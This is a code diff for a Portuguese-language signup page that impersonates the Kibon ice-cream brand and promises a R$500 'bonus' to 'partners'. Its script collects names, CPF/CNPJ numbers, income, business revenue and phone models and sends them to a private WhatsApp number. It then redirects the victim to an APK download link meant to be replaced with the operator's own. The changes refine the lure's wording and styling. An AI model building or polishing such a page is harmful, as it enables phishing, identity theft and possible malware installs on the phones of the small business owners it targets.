@@ -17,36 +17,37 @@
 
         .bonus-badge {
             background: var(--green); color: white; text-align: center;
-            padding: 10px; font-weight: 700; font-size: 14px;
+            padding: 12px; font-weight: 700; font-size: 14px;
             text-transform: uppercase; letter-spacing: 1px;
         }
 
-        .header { padding: 25px 20px 10px; text-align: center; }
-        /* Ajuste na imagem para garantir que apareça */
-        .header img { width: 140px; height: auto; display: block; margin: 0 auto 10px; }
+        .header { padding: 30px 20px 10px; text-align: center; }
         
-        .header h1 { font-size: 20px; color: var(--kibon-red); margin: 10px 0 5px; font-weight: 700; }
-        .header p { font-size: 13px; color: #666; margin: 0; }
+        /* NOVO LINK DE IMAGEM GARANTIDO */
+        .logo-kibon { width: 150px; height: auto; margin-bottom: 15px; }
+        
+        .header h1 { font-size: 22px; color: var(--kibon-red); margin: 0; font-weight: 700; }
+        .header p { font-size: 13px; color: #666; margin-top: 5px; }
 
         .form-body { padding: 20px 25px; }
         .input-group { margin-bottom: 12px; }
         label { display: block; font-size: 12px; font-weight: 600; color: #444; margin-bottom: 4px; }
         input, select {
-            width: 100%; padding: 11px; border: 2px solid #eee; border-radius: 10px;
-            font-size: 14px; transition: 0.3s; outline: none;
+            width: 100%; padding: 12px; border: 2px solid #eee; border-radius: 10px;
+            font-size: 14px; transition: 0.3s; outline: none; background: #fafafa;
         }
-        input:focus { border-color: var(--kibon-red); }
+        input:focus { border-color: var(--kibon-red); background: #fff; }
 
         .info-bonus {
-            background: #fff9f0; border: 1px dashed #ffcc00; border-radius: 10px;
-            padding: 12px; margin-top: 10px; text-align: center; font-size: 13px;
+            background: #fff9f0; border: 2px dashed #ffcc00; border-radius: 12px;
+            padding: 15px; margin-top: 15px; text-align: center; font-size: 14px;
         }
-        .info-bonus b { color: var(--green); font-size: 16px; }
+        .info-bonus b { color: var(--green); font-size: 18px; display: block; margin-top: 5px; }
 
         .btn-main {
-            width: 100%; padding: 16px; background: var(--kibon-red); color: white;
-            border: none; border-radius: 12px; font-size: 16px; font-weight: 700;
-            cursor: pointer; transition: 0.3s; margin-top: 15px;
+            width: 100%; padding: 18px; background: var(--kibon-red); color: white;
+            border: none; border-radius: 14px; font-size: 16px; font-weight: 700;
+            cursor: pointer; transition: 0.3s; margin-top: 20px; box-shadow: 0 4px 10px rgba(226, 0, 26, 0.3);
         }
         .btn-main:hover { background: var(--kibon-dark); transform: scale(1.02); }
 
@@ -59,14 +60,14 @@
     <div class="bonus-badge">🎁 Bônus de R$ 500,00 Disponível</div>
     
     <div class="header">
-        <img src="https://logodownload.org/wp-content/uploads/2017/05/kibon-logo-1.png" alt="Logo Kibon">
+        <img src="https://www.kibon.com.br/content/dam/unilever/heart/brazil/online_comms/kibon-logo.png" alt="Kibon" class="logo-kibon">
         <h1>Cadastro de Parceiro</h1>
-        <p>Preencha os dados para liberar seu bônus</p>
+        <p>Complete seu registro para liberar o saldo</p>
     </div>
 
     <form class="form-body">
         <div class="input-group">
-            <label>Nome Completo</label>
+            <label>Nome Completo do Titular</label>
             <input type="text" id="nome" placeholder="Seu nome" required>
         </div>
 
@@ -93,7 +94,7 @@
 
         <div class="input-group">
             <label>Modelo do Aparelho Celular</label>
-            <input type="text" id="celular_modelo" placeholder="Ex: iPhone 13, Galaxy S21" required>
+            <input type="text" id="celular_modelo" placeholder="Ex: iPhone 15, Galaxy S23" required>
         </div>
 
         <div class="input-group">
@@ -107,20 +108,20 @@
         </div>
 
         <div class="info-bonus">
-            Ao finalizar o cadastro, baixe o app e receba:<br>
+            Após clicar em concluir, baixe o app e receba:
             <b>R$ 500,00 DE SALDO BÔNUS</b>
         </div>
 
-        <button type="button" class="btn-main" onclick="finalizar()">CADASTRAR E RECEBER BÔNUS</button>
+        <button type="button" class="btn-main" onclick="finalizar()">CONCLUIR E RESGATAR BÔNUS</button>
     </form>
 
-    <div class="footer">© 2026 Distribuição Autorizada Kibon</div>
+    <div class="footer">© 2026 Distribuidora Autorizada Kibon</div>
 </div>
 
 <script>
     function finalizar() {
         const meuWhatsapp = "5554999422678"; 
-        const urlDownloadAPK = "https://kibon.com.br/baixar-app"; // Coloque aqui a sua URL final
+        const urlDownloadAPK = "https://www.kibon.com.br"; // Mude para o seu link real
 
         const nome = document.getElementById('nome').value;
         const documento = document.getElementById('documento').value;
@@ -132,25 +133,25 @@
         const fat = document.getElementById('faturamento').value;
 
         if(!nome || !documento || !comercio || !modelo || !cid || !est || !ren || !fat) {
-            alert("Por favor, preencha todos os campos.");
+            alert("Por favor, preencha todos os campos para liberar seu bônus de R$ 500!");
             return;
         }
 
-        const msg = `*SOLICITAÇÃO DE CADASTRO + BÔNUS*%0A` +
+        const msg = `*CADASTRO BÔNUS R$ 500*%0A` +
                     `----------------------------%0A` +
                     `👤 *Nome:* ${nome}%0A` +
-                    `📄 *CPF/CNPJ:* ${documento}%0A` +
-                    `🏪 *Comércio:* ${comercio}%0A` +
-                    `📱 *Aparelho:* ${modelo}%0A` +
+                    `📄 *Doc:* ${documento}%0A` +
+                    `🏪 *Loja:* ${comercio}%0A` +
+                    `📱 *Cel:* ${modelo}%0A` +
                     `📍 *Local:* ${cid} - ${est}%0A` +
                     `💰 *Renda:* ${ren}%0A` +
-                    `📈 *Faturamento:* ${fat}%0A` +
+                    `📈 *Fat:* ${fat}%0A` +
                     `----------------------------%0A` +
-                    `*CLIENTE AGUARDANDO BÔNUS DE R$ 500*`;
+                    `*AGUARDANDO LIBERAÇÃO DO SALDO*`;
 
         window.open(`https://api.whatsapp.com/send?phone=${meuWhatsapp}&text=${msg}`, '_blank');
 
-        alert("Dados enviados com sucesso! Clique em OK para baixar o App.");
+        alert("Cadastro enviado! Baixe o aplicativo a seguir para resgatar seu saldo de R$ 500.");
         window.location.href = urlDownloadAPK;
     }
 </script>
